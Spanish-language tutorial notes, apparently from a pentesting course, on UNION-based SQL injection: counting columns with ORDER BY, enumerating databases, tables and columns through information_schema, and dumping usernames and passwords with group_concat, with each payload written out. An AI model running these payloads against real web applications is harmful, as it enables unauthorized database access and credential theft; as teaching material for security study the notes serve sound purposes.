-- -
Primero empezamos viendo la cantidad de columnas que existen con el uso de order by.
```sql
id=3' order by 100-- -
```

Una vez vimos la cantidad de columnas que existen empezamos con el uso de union select para empezar a ver el contenido almacenado.
```sql
id=3' union select 1
```

Esto nos tendria que mostrar el dato que esta almacenado en la primer columna de la tabla.
Pero si en vez de poner un identificador valido, ponemos unos no valido nos va a empezar a reflejar lo que ponemos, y ahi es cuando podemos  empezar a eejcutar de todo.  
```sql
id=32' union select database();
```

Con este comando le pedimos que nos liste todas las bases de datos existentes.
```sql
id=32' union select schema_name from information_schema.schemata-- -
```

El problema es que a veces los resultados terminan siendo limitados. Para evitar eso es mejor jugar con la funcion group_concat().
```sql
id=32' union select group_concat(schema_name) from information_schema.schemata-- -
```

Luego, para enumerar las tablas de cierta base de datos podriamos ejecutar el siguiente comando.
```sql
id=32' union select group_concat(table_name) from information_schema.tables where table_schema='Hack4u'-- -
```

Luego, tambien para ver las columnas tendriamos q hacer algo muy similiar a lo anterior.
```sql
id=32' union select group_concat(column_name) from information_schema.columns where table_schema='Hack4u' and table_name='users'-- -
```

Para listar los usuarios podemos ejecutar el siguiente comando.
```sql
id=32' union select group_concat(username) from users-- -
```

Para listar los usuarios podemos ejecutar el siguiente comando.
```sql
id=32' union select group_concat(username,':',password) from users-- -
```

## Aclaraciones
------- 
- Con el order by tenemos que poner siempre la cantidad de columnas con un solo numero. Por ejemplo si la consulta sql es **"select username,password from users where id = '$id'")**, entonces la inyeccion con el order by seria: **id=1' order by 2-- -** ya que la consulta en si le esta pegando a 2 columnas dentro de la tabla.

- Luego, con el union select tendriamos que darle la cantidad de columas separadas por comas junto con un id valido, por ejemplo: **id=1' union select 1,2-- -** . Despues tendriamos que darle un valor erroneo al id para ver cual de los 2 numero separados por la coma nos muestra la pagina, ejemplo **id=-1' union select 1,2-- -**. Una vez vemos cual es el que nos muestra ahi mismo es donde tenemos que empezar a inyectar los comandos. **id=-1' union select database(),2-- -.